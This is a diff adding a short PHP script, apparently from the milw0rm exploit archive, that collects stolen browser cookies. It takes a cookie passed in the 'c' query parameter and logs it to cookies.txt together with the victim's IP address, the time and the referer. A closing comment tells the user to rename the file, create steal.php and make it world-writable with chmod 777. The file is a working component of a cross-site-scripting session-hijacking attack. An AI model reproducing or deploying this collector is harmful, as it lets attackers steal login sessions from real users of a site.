@@ -1,0 +1,15 @@
+// Original Author: 'Sjaak Rake' Ref: http://www.hackthissite.org/articles/read/175/
+
+<?php
+$cookie = $_GET['c'];
+$ip = getenv ('REMOTE_ADDR');
+$date=date("j F, Y, g:i a");
+$referer=getenv ('HTTP_REFERER');
+$fp = fopen('cookies.txt', 'a');
+fwrite($fp, 'Cookie: '.$cookie.'<br> IP: ' .$ip. '<br> Date and Time: ' .$date. '<br> Referer: '.$referer.'<br><br><br>');
+fclose($fp);
+?>
+
+//rename it to cookies.php and create one new file steal.php and chmod it to 777
+
+# milw0rm.com [2005-07-13]
